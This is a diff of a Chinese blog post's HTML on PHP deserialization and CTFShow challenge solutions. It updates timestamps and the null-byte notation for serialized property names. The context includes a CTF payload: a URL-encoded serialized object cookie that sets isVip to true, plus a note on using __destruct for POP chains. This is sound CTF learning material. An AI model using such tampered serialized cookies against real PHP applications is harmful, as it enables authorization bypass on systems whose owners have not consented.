@@ -26,7 +26,7 @@
 <meta property="og:description" content="PHP反序列化总结反序列化学的比较烂，所以这一篇基本上是CTFSHOW题解了。">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-07-08T13:29:01.223Z">
-<meta property="article:modified_time" content="2023-07-08T13:34:59.000Z">
+<meta property="article:modified_time" content="2023-09-08T03:07:43.786Z">
 <meta property="article:author" content="yansui">
 <meta name="twitter:card" content="summary">
     
@@ -231,8 +231,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2023-07-08 21:34:59</span>
-            <span class="mobile">2023-07-08 21:34:59</span>
+            <span class="desktop">2023-09-08 11:07:43</span>
+            <span class="mobile">2023-09-08 11:07:43</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -264,8 +264,8 @@
 <p>与反序列化相关的魔术方法：<br>构造方法__construct、析构方法__destruct在序列化和反序列化过程中都不会被调用<br>但是当某个对象被销毁时会调用析构方法，可以利用这一点构造POP链。</p>
 <p>反序列化不调用构造方法</p>
 <h3 id="3-关于类中不同类型的属性"><a href="#3-关于类中不同类型的属性" class="headerlink" title="3.关于类中不同类型的属性"></a>3.关于类中不同类型的属性</h3><p>public:反序列化得到的变量名就是它自己</p>
-<p>private:在变量名前添加标记\00(classname)\00，长度+2+类名长度: <code>s:17:&quot;\00FileHandler_Z\00op&quot;;i:2;</code></p>
-<p>protected:在变量名前添加标记\00*\00，长度+3: <code>s:5:&quot;\00*\00op&quot;;i:2;</code></p>
+<p>private:在变量名前添加标记%00(classname)%00，长度+2+类名长度: <code>s:17:&quot;%00FileHandler%00op&quot;;i:2;</code></p>
+<p>protected:在变量名前添加标记%00*%00，长度+3: <code>s:5:&quot;%00*%00op&quot;;i:2;</code></p>
 <h2 id="二、CTFShow题解"><a href="#二、CTFShow题解" class="headerlink" title="二、CTFShow题解"></a>二、CTFShow题解</h2><h3 id="Web254"><a href="#Web254" class="headerlink" title="Web254"></a>Web254</h3><p>有点难绷，账号和密码就是xxxxxx</p>
 <h3 id="Web255"><a href="#Web255" class="headerlink" title="Web255"></a>Web255</h3><p>payload:<br>GET &#x2F;?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx<br>COOKIE user&#x3D;O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</p>
 <p>一定记得URL编码，否则会出现奇怪的问题</p>
@@ -439,7 +439,7 @@
         <li><strong>创建于:</strong> 2023-07-08 21:29:01</li>
         
             <li>
-                <strong>更新于:</strong> 2023-07-08 21:34:59
+                <strong>更新于:</strong> 2023-09-08 11:07:43
             </li>
         
         <li>
